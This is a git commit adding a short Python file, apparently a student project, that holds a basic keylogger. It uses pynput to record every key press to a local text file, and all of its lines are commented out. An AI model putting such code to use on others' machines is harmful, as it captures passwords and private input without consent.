7df5a0ce11a1bcc3f665a902ea55b601108189b2
arhriyeb <113546383+arhriyeb@users.noreply.github.com>
2022-09-26 19:39:23 -0400

    Add files via upload

---
+++ KeyLogger.py
@@ -0,0 +1,20 @@
+# Amin Rhriyeb
+# September 25th 2022
+# Basic KeyLogger
+
+# import pynput
+# from pynput.keyboard import Key, Listener
+# import logging
+
+# setting up directory and location for logs to be kept
+
+# log_dir = r"C:\Users\aminr\Desktop\CS100HW\Python Projects\KeyLogger"
+# logging.basicConfig(filename = (log_dir + r"/keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')
+
+# converts key presses to string, then transfers key presses to be logged on .txt file
+
+# def on_press(key):
+#  logging.info(str(key))
+
+# with Listener(on_press=on_press) as listener:
+#    listener.join()
